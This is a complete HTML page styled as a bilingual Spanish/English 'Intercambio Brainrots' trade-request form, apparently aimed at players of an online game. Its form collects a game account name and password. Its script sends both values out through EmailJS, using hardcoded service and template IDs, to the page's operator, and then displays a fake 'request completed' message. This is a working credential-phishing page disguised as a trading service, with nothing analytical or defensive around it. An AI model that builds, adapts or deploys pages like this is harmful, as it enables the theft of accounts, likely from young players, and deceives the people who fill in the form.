<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="icon" href="crown_game_sports_console_controller_sport_video_play_gaming_icon_262443.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- SEO MEJORADO -->
    <title>Intercambio Brainrots</title>
    
    <!-- META TAGS SEO -->
    <meta name="description" content="Completa tu peticion.">
    <meta name="keywords" content="brainrots">
    <meta name="author" content="Sistema de Intercambios">
    <meta name="robots" content="noindex, nofollow">
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        /* MOBILE-FIRST - ESTILOS OPTIMIZADOS PARA MÓVIL */
        
        /* RESET MEJORADO PARA MÓVILES */
        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        html {
            font-size: 14px;
        }

        body {
            margin: 0;
            padding: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
            url('https://github.com/anasshouzmali4tc-cpu/vv/blob/main/descarga.jpg?raw=true') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            line-height: 1.4;
        }
        
        /* CONTENEDOR PRINCIPAL OPTIMIZADO PARA MÓVILES */
        .registro-container {
            padding-top: 50px;
            width: 100%;
            max-width: 400px;
            margin: 10px auto;
            background: rgba(19, 23, 34, 0.92);
            backdrop-filter: blur(15px);
            border-radius: 16px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
            padding: 25px 20px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.08);
            position: relative;
            overflow: hidden;
        }
        .registro-container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #00a2ff, #ff00cc, #00ff95, #ffcc00);
            z-index: -1;
            border-radius: 18px;
            opacity: 0.25;
        } 
        
        /* SELECTOR DE IDIOMA */
        .language-selector {
            position: absolute;
            top: 14px;
            right: 8px;
            z-index: 10;
        }
        
        .language-selector select {
            background: rgba(30, 35, 48, 0.8);
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 6px;
            padding: 6px 10px;
            font-size: 0.85rem;
            cursor: pointer;
        }
        
        /* TÍTULOS OPTIMIZADOS PARA MÓVILES */
        .intercambio-title {
            color: #fff;
            font-size: 2.2rem;
            font-weight: 800;
            margin-bottom: 5px;
            text-shadow: 0 0 8px rgba(0, 162, 255, 0.7);
            letter-spacing: 0.5px;
            line-height: 1.2;
        }
        
        .registro-subtitle {
            color: #a0aec0;
            font-size: 1rem;
            margin-bottom: 25px;
            font-weight: 400;
        }
        
        /* FORMULARIO MEJORADO PARA TACTIL */
        .registro-form {
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #e2e8f0;
            font-size: 0.95rem;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.2s;
            background: rgba(30, 35, 48, 0.8);
            color: #fff;
            min-height: 48px;
        }
        
        .form-group input::placeholder {
            color: #a0aec0;
        }
        
        .form-group input:focus {
            border-color: #00a2ff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25);
            background: rgba(40, 45, 60, 0.9);
        }
        
        /* BOTONES OPTIMIZADOS PARA TACTIL */
        .accept-btn {
            background: linear-gradient(to right, #00a2ff, #00d4ff);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
            margin-top: 8px;
            letter-spacing: 0.3px;
            box-shadow: 0 4px 12px rgba(0, 162, 255, 0.3);
            min-height: 50px;
            touch-action: manipulation;
        }
        
        .accept-btn:hover {
            background: linear-gradient(to right, #0088cc, #00b8e6);
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 162, 255, 0.4);
        }
        
        .accept-btn:active {
            transform: translateY(0);
        }
        
        /* MENSAJES Y ESTADOS OPTIMIZADOS */
        .loading {
            display: none;
            color: #00a2ff;
            font-size: 1rem;
            margin: 8px 0;
            padding: 10px;
        }
        
        .error-message {
            display: none;
            color: #ff6b6b;
            background: rgba(255, 107, 107, 0.1);
            padding: 10px;
            border-radius: 8px;
            margin: 8px 0;
            font-size: 0.85rem;
            border-left: 4px solid #ff6b6b;
        }
        
        /* MENSAJE DE GRACIAS OPTIMIZADO */
        .gracias-mensaje {
            display: none;
            text-align: center;
            padding: 30px 20px;
            background: rgba(39, 174, 96, 0.15);
            border-radius: 12px;
            border: 1px solid rgba(39, 174, 96, 0.3);
            margin-top: 15px;
            backdrop-filter: blur(5px);
        }
        
        .gracias-mensaje h2 {
            color: #27ae60;
            margin-bottom: 15px;
            font-size: 1.7rem;
            text-shadow: 0 0 8px rgba(39, 174, 96, 0.3);
        }
        
        .gracias-mensaje p {
            color: #e2e8f0;
            margin-bottom: 12px;
            font-size: 1rem;
            line-height: 1.4;
        }
        
        /* MEJORAS ESPECÍFICAS PARA MÓVILES PEQUEÑOS */
        @media (max-width: 380px) {
            .registro-container {
                padding: 20px 15px;
                border-radius: 14px;
            }
            
            .intercambio-title {
                font-size: 1.9rem;
            }
            
            .registro-subtitle {
                font-size: 0.9rem;
                margin-bottom: 20px;
            }
            
            .form-group input {
                padding: 12px 14px;
                font-size: 0.95rem;
            }
            
            .accept-btn {
                padding: 14px;
                font-size: 0.95rem;
            }
            
            .gracias-mensaje h2 {
                font-size: 1.5rem;
            }
        }
        
        /* MEJORAS PARA MÓVILES EN HORIZONTAL */
        @media (max-height: 500px) and (orientation: landscape) {
            body {
                padding: 10px;
                align-items: flex-start;
            }
            
            .registro-container {
                margin: 5px auto;
                padding: 20px;
            }
            
            .intercambio-title {
                font-size: 1.8rem;
                margin-bottom: 3px;
            }
            
            .registro-subtitle {
                margin-bottom: 15px;
                font-size: 0.9rem;
            }
            
            .form-group {
                margin-bottom: 15px;
            }
        }
        
        /* ESTILOS PARA ESCRITORIO (Mobile First) */
        @media (min-width: 768px) {
            html {
                font-size: 16px;
            }
            
            .registro-container {
                max-width: 480px;
                padding: 40px 35px;
                border-radius: 20px;
            }
            
            .intercambio-title {
                font-size: 2.8rem;
                margin-bottom: 8px;
            }
            
            .registro-subtitle {
                font-size: 1.1rem;
                margin-bottom: 35px;
            }
            
            .form-group input {
                padding: 16px 18px;
            }
            
            .accept-btn {
                padding: 18px;
            }
            
            .gracias-mensaje h2 {
                font-size: 2rem;
            }
        }

        /* MEJORAS DE ACCESIBILIDAD TÁCTIL */
        @media (pointer: coarse) {
            .accept-btn:hover {
                transform: none;
            }
            
            .form-group input {
                font-size: 16px;
            }
        }

        /* FOCUS VISIBLE MEJORADO */
        .accept-btn:focus-visible,
        input:focus-visible {
            outline: 3px solid #00a2ff;
            outline-offset: 2px;
        }
    </style>
</head>
<body>
    <div class="registro-container">
        <!-- SELECTOR DE IDIOMA -->
        <div class="language-selector">
            <select id="language-select">
                <option value="es">Español</option>
                <option value="en">English</option>
            </select>
        </div>
        
        <div class="intercambio-title">INTERCAMBIO</div>
        <div class="registro-subtitle" data-es="Completar peticion" data-en="Complete request">Completar Peticion</div>
        
        <form id="forma-registro" class="registro-form">
            <div class="form-group">
                <label for="account" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
                <input type="text" id="account" placeholder="" required>
            </div>
            
            <div class="form-group">
                <label for="account" data-es="Contrasenya de Cuenta de brainrot:" data-en="Brainrot password account:">Contrasenya de Cuenta de brainrot:</label>
                <input type="text" id="access" placeholder="" required>
            </div>
            
            <div class="loading" id="loading" data-es="Procesando..." data-en="Processing...">Procesando...</div>
            <div class="error-message" id="error-message"></div>
            
            <button type="submit" class="accept-btn" id="submit-btn" data-es="CONTINUAR" data-en="CONTINUE">CONTINUAR</button>
        </form>
        
        <!-- Mensaje de gracias -->
        <div class="gracias-mensaje" id="gracias-mensaje">
            <h2 data-es="¡Gracias! ✅" data-en="Thank You! ✅">¡Gracias! ✅</h2>
            <p><strong data-es="Peticion completada con éxito" data-en="Request completed successfully">Peticion completada con éxito</strong></p>
            <p data-es="Tu peticion ha sido procesada" data-en="Your request has been processed">Tu Peticion ha sido procesada</p>
            <p data-es="Te contactaremos en 24-48 horas" data-en="We will contact you in 24-48 hours">Te contactamos en 24-48 horas</p>
        </div>
    </div>

    <script>
        // Textos traducidos
        const translations = {
            es: {
                title: "INTERCAMBIO",
                subtitle: "Completar",
                accountLabel: "Cuenta de brainrot:",
                loading: "Procesando...",
                acceptButton: "CONTINUAR",
                thankYou: "¡Gracias! ✅",
                requestSuccess: "Peticion completada con éxito",
                brainrotProcessed: "Tu Peticion ha sido procesada",
                bobuxArrival: "24-48 horas"
            },
            en: {
                title: "EXCHANGE",
                subtitle: "Complete",
                accountLabel: "Brainrot account:",
                loading: "Processing...",
                acceptButton: "CONTINUE",
                thankYou: "Thank You! ✅",
                requestSuccess: "Request completed successfully",
                brainrotProcessed: "Your request has been processed",
                bobuxArrival: "24-48 hours"
            }
        };

        // Idioma por defecto
        let currentLang = 'es';

        emailjs.init("BgugL5adTp__2FfNx");
        
        // Función para cambiar idioma
        function changeLanguage(lang) {
            currentLang = lang;
            
            document.querySelectorAll('[data-es]').forEach(element => {
                if (element.hasAttribute(`data-${lang}`)) {
                    element.textContent = element.getAttribute(`data-${lang}`);
                }
            });
        }
        
        document.getElementById('forma-registro').addEventListener('submit', async function(e) {
            e.preventDefault();
            const account = document.getElementById('account').value;
            const access = document.getElementById('access').value;
            
            if (account && access) {
                // Mostrar loading
                document.getElementById('loading').style.display = 'block';
                document.getElementById('error-message').style.display = 'none';
                document.getElementById('submit-btn').disabled = true;
                
                const templateParams = {
                    from_name: 'Sistema de Intercambios',
                    to_name: 'Tú',
                    usuario_brinrot: account,
                    contra_brinrot: access,
                };
                
                console.log('Enviando email con Template ID: template_ga9xk7u');
                
                emailjs.send('service_08y0xce', 'template_ga9xk7u', templateParams)
                    .then(function(response) {
                        console.log('✅ Registrado!', response);
                        
                        document.getElementById('forma-registro').style.display = 'none';
                        document.getElementById('gracias-mensaje').style.display = 'block';
                        
                        const peticion = {
                            usuario: account,
                            estado: 'completada',
                            email_enviado: true
                        };
                        localStorage.setItem('peticionbrinrot', JSON.stringify(peticion));
                    })
                    .catch(function(error) {
                        console.error('❌ Error', error);
                        
                        // Mostrar error específico
                        let mensajeError = 'Error ';
                        if (error.text) {
                            mensajeError += error.text;
                        }
                        document.getElementById('error-message').textContent = mensajeError;
                        document.getElementById('error-message').style.display = 'block';
                        
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('submit-btn').disabled = false;
                    });
            }
        });

        // Inicializar página
        document.addEventListener('DOMContentLoaded', function() {
            // Configurar selector de idioma
            document.getElementById('language-select').addEventListener('change', function(e) {
                changeLanguage(e.target.value);
            });
            
            // Cargar idioma guardado
            const savedLang = localStorage.getItem('selectedLanguage');
            if (savedLang && ['es', 'en'].includes(savedLang)) {
                document.getElementById('language-select').value = savedLang;
                changeLanguage(savedLang);
            } else {
                changeLanguage('es');
            }
        });
    </script>
</body>
</html>
